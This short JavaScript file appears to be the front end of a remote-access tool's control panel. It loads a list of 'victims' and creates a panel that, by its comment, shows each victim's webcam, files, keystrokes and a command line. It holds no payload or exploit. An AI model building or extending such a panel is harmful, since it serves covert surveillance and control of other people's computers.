
let allVictims = [];
let selectedVictim = null;

(async function build() {
    allVictims = await getAllVictims();

    // Create component showing list of victims
    const victimPanel = document.createElement("victims-panel");

    // add relevent content to the template
    victimPanel.victims = JSON.stringify(allVictims);

    // Append the instance to the DOM
    document.getElementById("victimsPanelContainer").appendChild(victimPanel);

    // Create component showing victim properties, web camera, file directory, keystrokes, and command line.
    const commandPanel = document.createElement("command-panel");
    document.getElementById("commandPanelContainer").appendChild(commandPanel);
})();